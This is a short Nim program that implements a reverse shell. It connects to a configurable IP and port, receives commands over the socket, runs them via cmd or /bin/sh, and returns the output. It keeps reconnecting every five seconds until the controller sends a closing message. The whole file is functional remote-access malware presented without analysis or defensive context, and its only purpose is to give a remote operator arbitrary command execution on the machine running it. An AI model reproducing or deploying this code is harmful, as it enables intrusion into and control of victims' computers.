import net
import osproc
import os

var ip = "127.0.0.1"
var port = 2121

var socket = newSocket()
var scomand : string
while true:
    try:
        socket.connect(ip, Port(port))

        while true:
            try:
                socket.send("<nimshell>")
                var command = socket.recvLine()
                if command == "closing...":
                    socket.send("bye")
                    socket.close()
                    system.quit(0)
                if system.hostOS == "windows":
                   scomand = "cmd /C" & command
                else:
                    scomand = "/bin/sh -c " & command
                var (cmdres, _) = execCmdEx(scomand)
                socket.send(cmdres)
            except:
                socket.close()
                system.quit(0)
    except:
        echo "problem with your connection... reconnecting(5sec)"
        sleep(5000)
        continue